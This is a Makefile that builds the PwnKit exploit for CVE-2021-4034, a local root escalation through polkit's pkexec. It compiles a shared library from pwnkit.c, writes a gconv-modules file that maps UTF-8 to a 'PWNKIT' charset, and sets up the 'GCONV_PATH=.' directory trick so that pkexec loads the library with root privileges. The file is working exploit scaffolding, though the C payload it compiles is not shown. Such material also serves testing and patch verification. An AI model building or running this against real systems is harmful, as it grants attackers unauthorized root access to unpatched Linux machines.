#!bin/bash

.PHONY: all
all: pwnkit.so cve-2021-4034 gconv-modules gconvpath

gconv-modules:
	echo "module UTF-8// PWNKIT// pwnkit 1" > $@

.PHONY: gconvpath
gconvpath:
	mkdir -p GCONV_PATH=.
	cp pwnkit.so GCONV_PATH=./pwnkit.so:.

pwnkit.so: pwnkit.c
	gcc -Wall --shared -fPIC -o $@ $<

.PHONY: dry-run
dry-run:
	make -C dry-run
